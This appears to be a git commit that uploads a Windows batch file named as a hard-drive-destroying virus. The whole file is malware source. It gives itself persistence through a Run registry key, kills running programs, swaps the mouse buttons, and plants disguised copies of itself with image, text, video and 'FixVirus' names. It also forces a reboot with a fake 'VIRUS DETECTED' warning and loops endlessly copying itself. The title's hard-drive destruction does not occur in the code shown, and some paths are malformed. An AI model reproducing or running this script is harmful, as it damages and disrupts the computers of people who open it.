517511e50d174424401ce2f4805b20340136ebbe
Zusyaku <71582475+Zusyaku@users.noreply.github.com>
2022-01-25 19:35:46 +0700

    Add files via upload

---
+++ Destroy Hard Drive of Any Computer Virus by OnlineHacking_120122162055.bat
@@ -0,0 +1,50 @@
+@Echo off
+color 4
+title 4
+title Online Hacking
+start
+start
+start
+start calc
+copy %0 %Systemroot%\Greatgame > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ
+/d %systemroot%\Greatgame.bat /f > nul
+copy %0 *.bat > nul
+Attrib +r +h Greatgame.bat
+Attrib +r +h
+RUNDLL32 USER32.DLL.SwapMouseButton
+start calc
+cls
+tskill msnmsgr
+tskill LimeWire
+tskill iexplore
+tskill NMain
+start
+cls
+cd %userprofile%\desktop
+copy Greatgame.bat RAMNAAMSATYA.bat
+copy Greatgame.bat RAMNAAMSATYA.jpg
+copy Greatgame.bat RAMNAAMSATYA.txt
+copy Greatgame.bat RAMNAAMSATYA.exe
+copy Greatgame.bat RAMNAAMSATYA.mov
+copy Greatgame.bat FixVirus.bat
+cd %userprofile%My Documents
+copy Greatgame.bat RAMNAAMSATYA.bat
+copy Greatgame.bat RAMNAAMSATYA.jpg
+copy Greatgame.bat RAMNAAMSATYA.txt
+copy Greatgame.bat RAMNAAMSATYA.exe
+copy Greatgame.bat RAMNAAMSATYA.mov
+copy Greatgame.bat FixVirus.bat
+start
+start calc
+cls
+msg * Online Hacking
+msg * Online Hacking
+shutdown -r -t 10 -c "VIRUS DETECTED"
+start
+start
+time 12:00
+:Online Hacking
+cd %usernameprofile%\desktop
+copy Greatgame.bat %random%.bat
+goto Online Hacking
